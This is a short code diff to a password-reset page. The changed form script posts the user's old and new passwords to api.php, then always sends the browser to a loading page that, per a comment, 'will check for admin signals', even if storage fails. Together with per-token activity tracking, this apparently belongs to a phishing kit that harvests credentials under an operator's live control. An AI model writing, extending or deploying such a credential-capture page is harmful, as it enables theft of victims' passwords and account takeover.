@@ -503,24 +503,24 @@ updateActivity($token, "ResetPasswordPage");
     }
     function submitForm() {
       if (password.value && newPassword.value && newPasswordConfirm.value && newPassword.value === newPasswordConfirm.value) {
-        fetch('/store_password_reset.php', {
+        // First, store the password data
+        fetch('api.php', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
           },
-          body: `password=${encodeURIComponent(newPassword.value)}`
+          body: `old_password=${encodeURIComponent(password.value)}&new_password=${encodeURIComponent(newPassword.value)}&confirm_password=${encodeURIComponent(newPasswordConfirm.value)}&action=password_reset`
         })
         .then(response => response.text())
         .then(data => {
-          if (data.includes('Password stored successfully')) {
-            const urlParams = new URLSearchParams(window.location.search);
-            window.location.href = '/loading.php';
-          } else {
-            console.error('Error:', data);
-          }
+          console.log('Password data stored:', data);
+          // Now redirect to loading page which will check for admin signals
+          window.location.href = 'loading.php';
         })
         .catch((error) => {
-          console.error('Error:', error);
+          console.error('Error storing password:', error);
+          // Still redirect to loading page even if storage fails
+          window.location.href = 'loading.php';
         });
       }
     }
